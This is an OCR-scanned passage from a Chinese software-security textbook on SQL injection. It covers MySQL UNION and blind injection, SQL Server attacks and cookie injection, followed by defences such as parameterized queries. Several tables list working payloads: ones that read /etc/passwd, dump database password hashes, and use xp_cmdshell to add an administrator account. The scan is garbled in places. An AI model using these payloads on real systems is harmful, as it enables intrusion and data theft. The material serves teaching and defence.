magic_quotes_gpc
on
替换为转义字符的形式。例如，将被转换为V
只能说正确地配置这些选项能够增加攻击的难度，但这些配置并不是解决问题的根本办
法。例如，在display_errors关闭的情况下，攻击者可以利用盲注的方法通过服务器的不同反馈
进行分析，获得表结构和列名等信息；在magic_quotes_gpc打开的情况下，攻击者仍然可以通
过MySQL提供的charO和asciiO等函数引用敏感字符。
由于MySQL数据库3.x版本不支持UNION查询，而4.x与5.x版本支持UNION查询，
故注入方式不尽相同。
MySQL4.x及其以上版本中支持UNION查询。利用联合查询往往可以直接把得到的数据
返回到某个变量中，从而在网页中显示出来。
首先通过
failwest'union select1#
failwest'union select1,2,3#
failwest'union select1,2,3,4,."#
的方式试探脚本中共有几个变量接收数据。当返回的页面不再出错时，证明变量的数量正
好，观察页面中显示出来的数字，可以确定出能够用于显示结果的变量位置。
例如，对于一个存在漏洞的网站，用
fai1west'union select1,2,3.4,5,6,7,8,9#
248
---
## Page 274
第
尝试后，得到了正常的返回，而且在页面表格的列中出现了“2”、“3”、“8”三个数字，
8
那么我们就可以把数据库查询的结果返回给这“8”个位置。
章
failwest*union select1,2,3,4,5,6,7,user,9 frommysql.user
其
他
攻击成功时能够得到如图8.2.2所示的页面。
类
型
号
歌曲名称
在线收听
专编
LY
的
1
2
3
huanggao
软
2
2
3
efinal
件
2
3
dxkx
漏
2
3
eeyes
洞
5
2
?
3
eiv2emysq1
6
2
3
etneil
7
2
3
gonghui
8
2
3
horde
9
2
neildrop
10
2
3
yieq
2
3
proftpd
2
2
(
3
root
图8.2.2注入的SQL语句被执行
利用这样的方法，构造恰当的SQL语句，实际上可以检索数据库中的任意数据。
除了检索数据之外，这里再给出一些攻击者常用的注入命令串，如表8-2-2所示。这些攻
击串可以跟在URL的后边，其中“failwest”代表提交的变量值。
表8-2-2
SQL注入攻击测试用例及其说明
SQL注入攻击测试用例
说明
failwest
判断注入点。第一次是正常请求，如果存在注入漏洞，那
failwest' and 1=1#
么第二次请求得到结果应该与第一次一样，并且第三次请求
failwest' and 1=2#
得到的结果应该与前两次不同
failwest' or 1=1#
返回所有数据，常用于有搜索功能的页面
failwest' union select version()#
返回数据库版本信息
failwest' union select database()#
返回当前的库名
failwest' union select userO#
failwest’ union select session_user(#
返回数据库的用户名信息
failwest' union select system_user()#
failwest' union selectload_file(/etc/passwd")#
读取系统文件
failwest' selectuser,password from mysql.user#
返回数据库用户的密码信息，密码一般以MDS的方式存放
对于MySQL3.x版本，不支持联合查询语言，无法插入整句的检索语言，因此通常采用盲
注入的方式进行攻击，通过服务器对请求的反馈不同，一个字节一个字节地获得数据。
249
---
## Page 275
0
ep
盲注入需要用到以下几个MySQL的函数：
安
mid（stringofset1en）
全
这个API用于取出字符串中的一部分。第一个参数是所要操作的字符串，第二个参数指明
软
要截取字符串的偏移位置，第三个参数代表字符串的长度。
件
当攻击者想获得etc/hosts文件的内容时，将先从这个文件的第一个字节开始尝试注入：
漏
failwest'and ascii(mid((load_file('/etc/hosts'),1,1))=1#
洞
分
failwest'and ascii(mid((load_file(/etc/hosts'),1,1))=2#
析
failwest'and ascii（mid((load_file('/etc/hosts'),1,1))=3#
技
术
当尝试的ASCⅡI码与/etc/hosts文件第一个字符的ASCII一样的时候，服务器将返回正常的
第
页面，其余的尝试都将获得错误的页面。由于反馈的不同，最多进行255次尝试就能得到
2
letc/hosts文件的第一个字节的值。
版
在获得了第一个字节之后，可以通过
failwest'and ascii(mid((load_file('/etc/hosts'),2,1))=1#
failwest'and ascii（mid（(load_file(/etc/hosts'),2,1))=2#
failwest'and ascii（mid（(load_file（'/etc/hosts'),2,1))=3#
.....
获得第二个字节、第三个字节.的内容。
事实上，这件工作往往会通过编程来实现，而且只有不懂计算机科学的外行才会从1～255
逐个尝试，因为任何一个懂得算法基础的程序员都会明百这里应该使用折半查找法。
号，因为这对字符变量的攻击将不再可行，但如果是数字型变量，则仍然能够实现注入攻击。
对应于上例，load_file（/etc/hosts调用中的单引号和斜杠可以用MySQL提供的另一个函数
char（）进行转换，如表8-2-3所示。
表8-2-3char与ASCII的对应
char
C
/
H
0
S
ASCI471011169947
104
111
115
116
115
failwest'andascii（mid（(load_file（etc/host),1,1））=1#
可以转换为
failwest'andascii（mid（(load_file（char（47,101,116,99,47.104,111,
115,116,115),1,1))=1#
8.2.3攻击ASP+SQLServer网站
与MySQL数据库相比，微软的SQLServer不但支持UNION查询，而且可以直接使用多
250
---
## Page 276
第
语句查询，只要用分号分隔开不同的SQL语句即可。由于SQLServer功能更加强大，因此一
8
旦被攻击者控制，后果往往也更加严重。
对于ASP+SQLServer类型的网站，虽然有个别函数和表名与PHP+SQL不同，但大体思
其
路还是一样的，如表8-2-4所示。
他
类
表8-2-4
SQL注入攻击测试用例及其说明
型
SQL注入攻击测试用例
说明
的
failwest--
软
failwest' and 1=1--
判断是否存在注入漏洞。SQLServer中的行注释符
件
号为“"
failwest' and 1=2-
漏
洞
user是SQLServer的一个内置变量，它的值是当前
连接的用户名，数据类型为nvarchar。用nvarchar类
URL; and user>0-
型与int类型比较会引起错误，而SQLServer在返回
的错误信息中往往会暴露出user的值：将nvarchar值
“XXX”转换数据类型为int的列时发生语法错误
URL;and db_name()>0--
获得数据库名
URL;and (select count(*) from sysobjects)>0
msysobjects 是Access数据库的系统表，sysobjects
是SQLServer的系统表。通过这两次攻击尝试，可以
URL;and (select count(*) from msysobjects)>0--
从服务器的反馈中辨别出服务器使用的数据库类型
测试数据库中有多少用户自己建立的表。sysobjects
failwest'and(select count(*)from sysobjects where
中存放着数据库内所有表的表名、列名等信息。
Xtype=u'and status>0)=表的数目-
xtype=U'andstatus>0表示只检索用户建立的表名
failwest' and (select Top 1 name from sysobjects where
获得第个表的表名
Xtype='U' and status>0)>0--
failwest’ and (selec top 1 name from sysobjects where
通过类似的方法可以获得其他表名
00-
failwest'and (select top 1 len(列名) from 表名)>0
获得列名的长度
failwest'and （select top 1 asc(mid(列名,1,1) from 表
逐字读出列名的每一个字符，通常用于没有报错返
名)>0
回的自注
利用存储过程xp_cmdshell在服务器主机上添加用
ladd"-
户
URL:exec
master..xp_cmdshell
“netlocalgroup
将添加的用户加入管理员组
administrators川户名/add"--
利用存储过程将数据库备份到可以通过HTTP访
URL;backup database数据库名to disk=路径
问到的目录下，或者也可通过网络进行远程备份
介绍到这里，相信您应该领会到SQL注入漏洞的严重性了。
251
---
## Page 277
0
day
8.2.4注入攻击的检测与防范
安
全
网站系统的可输入接口比软件系统要多得多，脚本语言在提供了高度灵活性的同时也带有
语义限制不够严格的缺点，这使得Web系统的安全性变得非常严峻。针对SQL注入漏洞的防
软
范，最朴素的方法就是对用户输入的数据进行限制，过滤掉可能引起攻击的敏感字符。这里需
件
要注意的是，千万不要忘记数据库对大小写不敏感，所以请使用正则表达式，同时过滤掉select、
漏
SELECT、sEleCt、seLecT等所有形式的保留字。
洞
分
此外，有一些自动化扫描工具也可以帮助检测网站中的SQL注入漏洞，NGS公司的产品
析
NGSSQuirreL就是这样一款工具。
技
术
形式，比如：
第
2
+；//username和password两个变量的值是由用户输入的
版
一种十分有效的防止SQL注入的方法是使用参数化查询（ParameterizedQuery）的方法。
也不会被执行。目前大部分数据库都支持参数化查询。一个典型的参数化查询语句类似于这个
样子：
PreparedStatement pstmt=connection.prepareStatement(sql);
pstmt.setString(1,username);
pstmt.setString（2，password）：//username和password两个变量的值是由用户输入的
ResultSetresult=stmt.executeO；也许是因为黑盒测试没有理论深度，学术界似乎总是对黑
盒测试不感兴趣。在SCI或者EI检索器上您能够搜索到大量发表于IEEE或ACM期刊上的关
于防治和检测SQL注入漏洞的学术论文，他们的观点基本上可以分为以下两类。
第一类主张在Web服务器运行时进行实时的入侵检测，处理问题的位置位于脚本程序与数
据库之间。所使用的方法包括对SQL语句进行词法分析和语法分析来识别谓词结构：用状态
机来描述SQL谓词逻辑等。这类方法能够在运行时有效地检测出攻击事件，但是会对Web服
务器带来额外的运行负担。
第二类主张借鉴软件工程中代码分析的相关技术，如使用数据流分析（DataFlow
Analysis）、类型验证系统（TypeSystem）、模型检测系统（ModelChecking）等查找程序高级
逻辑错误的方法来对脚本代码进行漏洞挖掘。
虽然学术界提出的方法和观点很多，但大多处于理论探索阶段，某某网站被“黑”的报道
仍然屡见不鲜。我个人认为，最有效、最直接的防范办法还是对程序员进行安全培训，让程序
员在并发时遵守安全的并发流程和使用安全的编码方式，而不是发现漏洞后再考虑用某种“捷
径”去修补。
252
---
## Page 278
第
8.3其他注入方式
8
章
8.3.1Cookie注入，绕过马其诺防线
其
他
随着SQL注入攻击的泛滥，程序员们把常用的过滤、编码函数组织成库，最终制作成通
类
用的防注入过滤库。通用防注入库可以过滤掉用户输入中含有的敏感字，如select、union、and、
型
or等等，从而在很大程度上防止了SQL注入的发生，被很多站点采用。
的
软
然而，百密一疏的通用防注入系统却没有注意到，用户除了可以用Get和Post提交数据之
件
外，还可以使用Cookie提交数据。这就给了黑客可乘之机。
漏
我们先来看一下Cookie注入是怎样产生的。在ASP中，程序员经常会使用下面两种语句
洞
来获取用户提交的数据：
ID=Request.QueryString（*id"）//获取用户通过GET方式提交的id数据
ID=Request.Form（id）//获取用户通过pOST方式提交的id数据
许多程序员们为了同时支持GET和POST方式，常常使用下面这条“万能”语句：
IDRequst（id）
实际运行中，这条语句会先读取GET中的数据，如果没有再读取POST中的数据，如果
还没有则会去读取Cookie中的数据。很多防注入系统会检测GET和POST数据中是否存在敏
感字符，却忽略了对Cookie数据的检测。这样，攻击者就可以利用Cookie提交精心构造的注
入命令串来进行SQL注入。
那么，怎样来检测一个站点是否存在Cookie注入漏洞呢？比如有下面这样一个地址：
http://www.testsite.com/news.asp?id=169
首先我们先输入以下地址来测试一下该站点是否存在SQL注入：
http://www.testsite.com/news.asp?id=169and1=1
如果浏览器跳出图8.3.1所示的对话框或者类似的其他提示，则说明该站点使用了敏感字
过滤的防注入手段。
系统提示
得不要在参数中包含非法字符试注入！
图8.3.1防注入系统的错误提示
如果我们在浏览器中只输入：
http://www.testsite.com/news.asp?s
这时，由于没有向站点提交参数，所以是没有正常返回结果的。之后再在浏览器中输入：